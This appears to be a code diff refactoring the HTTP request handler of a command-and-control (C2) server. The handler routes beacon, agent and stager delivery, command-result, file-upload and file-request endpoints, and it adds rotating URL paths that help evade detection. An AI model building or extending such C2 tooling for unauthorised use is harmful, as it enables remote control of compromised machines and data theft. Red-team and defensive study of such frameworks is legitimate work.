@@ -1,15 +1,7 @@
 import http.server
 import logging
-# Direct imports from handler files
-from handlers.beacon_handler import BeaconHandler
-from handlers.agent_handler import AgentHandler
-from handlers.file_handler import FileHandler
-from handlers.result_handler import ResultHandler
-from handlers.file_download_handler import FileDownloadHandler
-from core.path_routing import PathRouter
-from core.client_operations import ClientHelper
-from core.crypto_operations import CryptoHelper
-
+import json
+import base64
 
 logger = logging.getLogger(__name__)
 
@@ -19,41 +11,129 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     Routes requests to appropriate handlers using modular architecture
     """
     
-    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
-        # Store parameters for later use
-        self.client_manager = client_manager
-        self.external_logger = logger  # External logger function
-        self.crypto_manager = crypto_manager
-        self.campaign_name = campaign_name
+    def __init__(self, request, client_address, server):
+        # Store server attributes before calling parent's init
+        self.server = server
+        self.campaign_name = getattr(server, 'campaign_name', 'default')
+        self.client_manager = getattr(server, 'client_manager', None)
+        self.logger_func = getattr(server, 'logger_func', logging.info)
+        self.crypto_manager = getattr(server, 'crypto_manager', None)
+        self.external_logger = self.logger_func
         
-        # Set default URL paths
+        # Default paths in case we need them as fallback
         self.default_paths = {
             "beacon_path": "/beacon",
             "agent_path": "/raw_agent",
             "stager_path": "/b64_stager",
             "cmd_result_path": "/command_result",
             "file_upload_path": "/file_upload",
-            "file_request_path": "/file_request"  # Added file_request_path
+            "file_request_path": "/file_request"
         }
         
-        # Initialize path rotation
-        self._initialize_path_rotation(server, url_paths)
+        # Save client_address for later use
+        self._client_address = client_address
         
-        # Create helper objects
-        self.crypto_helper = CryptoHelper(crypto_manager, client_manager)
-        self.client_helper = ClientHelper(client_manager, self.crypto_helper, server)
-                
-        # Initialize handler instances
-        # We'll create these on demand in the route methods
-        
+        # Call parent init - this will call setup() and handle()
         super().__init__(request, client_address, server)
+    
+    def log_message(self, format_str, *args):
+        """Override to use external logger - fixed to handle f-strings properly"""
+        # Instead of using % formatting, we'll just pass the formatted string directly
+        if args:
+            # If traditional args are provided, use standard formatting
+            message = format_str % args
+        else:
+            # Otherwise, assume format_str is already formatted (e.g., from an f-string)
+            message = format_str
+            
+        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {message}")
 
-    def _initialize_path_rotation(self, server, url_paths=None):
+    def do_GET(self):
+        """Route GET requests to the unified operation router"""
+        # Initialize components just before handling the request
+        self._initialize_components()
+        
+        # Check if rotation is needed
+        if self.path_router.check_rotation():
+            self.external_logger(f"Paths rotated during request handling")
+
+        # Log the request
+        self.log_message(f"Received GET request for {self.path}")
+
+        # Extract base path without query string for routing
+        base_path = self.path.split('?')[0] if '?' in self.path else self.path
+        
+        # First check if the path is valid (part of our path pool)
+        endpoint_type = self.path_router.get_endpoint_type(base_path)
+        
+        if endpoint_type:
+            # Valid path in our pool, route to operation router
+            self.operation_router.handle_operation(method="GET")
+        else:
+            # Not a valid path, handle as default
+            self._handle_default()
+    
+    def do_POST(self):
+        """Route POST requests to the unified operation router"""
+        # Initialize components just before handling the request
+        self._initialize_components()
+        
+        # Check if rotation is needed
+        if self.path_router.check_rotation():
+            self.external_logger(f"Paths rotated during request handling")
+        
+        # Log the request
+        self.log_message(f"Received POST request for {self.path}")
+        
+        # Check if this path is in our valid path pool
+        endpoint_type = self.path_router.get_endpoint_type(self.path)
+        
+        if endpoint_type:
+            # Valid path in our pool, route to operation router
+            self.operation_router.handle_operation(method="POST")
+        else:
+            # Not a valid path, handle as default
+            self._handle_default()
+    
+    def _initialize_components(self):
+        """Initialize components when actually handling a request"""
+        # Only initialize once
+        if hasattr(self, 'path_router'):
+            return
+            
+        # Initialize path rotation manager
+        self._initialize_path_rotation(self.server)
+        
+        # Initialize crypto helper
+        if self.crypto_manager is not None:
+            from core.crypto_operations import CryptoHelper
+            self.crypto_helper = CryptoHelper(self.crypto_manager, self.client_manager)
+        else:
+            self.crypto_helper = None
+            
+        # Initialize client helper if we have client manager and crypto helper
+        if self.client_manager is not None and self.crypto_helper is not None:
+            from core.client_operations import ClientHelper
+            self.client_helper = ClientHelper(self.client_manager, self.crypto_helper, self.server)
+        else:
+            self.client_helper = None
+            
+        # Create a new operation router for dynamic path handling
+        from core.operation_router import OperationRouter
+        self.operation_router = OperationRouter(
+            self,
+            self.client_manager,
+            self.crypto_helper, 
+            self.client_helper,
+            self.path_router
+        )
+
+    def _initialize_path_rotation(self, server):
         """Initialize path rotation manager"""
-        # Update paths with custom paths if provided
+        # Update paths with custom paths from server if provided
         initial_paths = self.default_paths.copy()
-        if url_paths:
-            initial_paths.update(url_paths)
+        if hasattr(server, 'url_paths') and server.url_paths:
+            initial_paths.update(server.url_paths)
             
         # Make sure all paths start with '/'
         for key, path in initial_paths.items():
@@ -80,167 +160,8 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             server.path_manager = path_manager
             
         # Create path router using the path manager
+        from core.path_routing import PathRouter
         self.path_router = PathRouter(path_manager)
-
-    def log_message(self, format_str, *args):
-        """Override to use external logger - fixed to handle f-strings properly"""
-        # Instead of using % formatting, we'll just pass the formatted string directly
-        if args:
-            # If traditional args are provided, use standard formatting
-            message = format_str % args
-        else:
-            # Otherwise, assume format_str is already formatted (e.g., from an f-string)
-            message = format_str
-            
-        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {message}")
-
-    def do_GET(self):
-        """Route GET requests to appropriate handlers"""
-        # Check if rotation is needed
-        if self.path_router.check_rotation():
-            self.external_logger(f"Paths rotated during request handling")
-
-        # Log the request
-        self.log_message("Received GET request for %s", self.path)
-
-        # Extract base path without query string for routing
-        base_path = self.path.split('?')[0] if '?' in self.path else self.path
-
-        # Log all available paths for debugging
-        self.external_logger(f"Available paths: {self.path_router.get_current_paths()}")
-        self.external_logger(f"Routing request for path: {base_path}")
-        
-        # Print path mapping for debugging
-        if hasattr(self.path_router, 'path_mapping'):
-            self.external_logger(f"Path mapping: {self.path_router.path_mapping}")
-
-        # Check which endpoint this path maps to
-        endpoint_type = self.path_router.get_endpoint_type(base_path)
-        self.external_logger(f"Endpoint type determined: {endpoint_type}")
-        
-        # Route to appropriate handler based on endpoint type
-        if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
-            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
-        elif endpoint_type in ["agent_path", "previous_agent_path", "old_agent_path"]:
-            self._handle_agent()
-        elif endpoint_type in ["stager_path", "previous_stager_path", "old_stager_path"]:
-            self._handle_stager()
-        elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
-            self._handle_file_download()
-        else:
-            self._handle_default()
-    
-    def do_POST(self):
-        """Route POST requests to appropriate handlers"""
-        # Check if rotation is needed
-        if self.path_router.check_rotation():
-            self.external_logger(f"Paths rotated during request handling")
-        
-        # Log the request
-        self.log_message("Received POST request for %s", self.path)
-        
-        # Static path mapping for backward compatibility
-        static_path_mapping = {
-            "/file_request": "file_request_path",
-            "/file_upload": "file_upload_path",
-            "/beacon": "beacon_path",
-            "/command_result": "cmd_result_path"
-        }
-        
-        # Check if this is a known static path
-        if self.path in static_path_mapping:
-            self.external_logger(f"Converting static path {self.path} to {static_path_mapping[self.path]}")
-            endpoint_type = static_path_mapping[self.path]
-        else:
-            # Check which endpoint this path maps to
-            endpoint_type = self.path_router.get_endpoint_type(self.path)
-        
-        self.external_logger(f"POST endpoint type determined: {endpoint_type}")
-        
-        # Route to appropriate handler based on endpoint type
-        if endpoint_type == "file_request_path" or endpoint_type in ["previous_file_request_path", "old_file_request_path"]:
-            self.external_logger(f"Handling file download request")
-            self._handle_file_download()
-        elif endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
-            # Add this case to handle POST beacons
-            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
-        elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
-            self._handle_result()
-        elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
-            self.external_logger(f"Handling file upload request")
-            self._handle_file_upload()
-        else:
-            # Return a generic 200 response for unmatched paths
-            self.external_logger(f"No handler found for {self.path}, using default handler")
-            self._handle_default()
-    
-    def _handle_beacon(self, include_rotation_info=False):
-        """Handle beacon requests using BeaconHandler"""
-        handler = BeaconHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle(include_rotation_info=include_rotation_info)
-    
-    def _handle_agent(self):
-        """Handle agent code requests using AgentHandler"""
-        handler = AgentHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle_agent_request()
-    
-    def _handle_stager(self):
-        """Handle stager requests using AgentHandler"""
-        handler = AgentHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle_stager_request()
-    
-    def _handle_result(self):
-        """Handle command result requests using ResultHandler"""
-        handler = ResultHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle()
-    
-    def _handle_file_upload(self):
-        """Handle file upload requests using FileHandler"""
-        self.external_logger(f"Creating FileHandler for file upload")
-        handler = FileHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle()
-    
-    def _handle_file_download(self):
-        """Handle file download requests using FileDownloadHandler"""
-        self.external_logger(f"Creating FileDownloadHandler for file download")
-        handler = FileDownloadHandler(
-            self, 
-            self.client_manager, 
-            self.crypto_helper, 
-            self.client_helper, 
-            self.path_router
-        )
-        handler.handle()
     
     def _handle_default(self):
         """Handle default/unmatched paths with a generic response"""
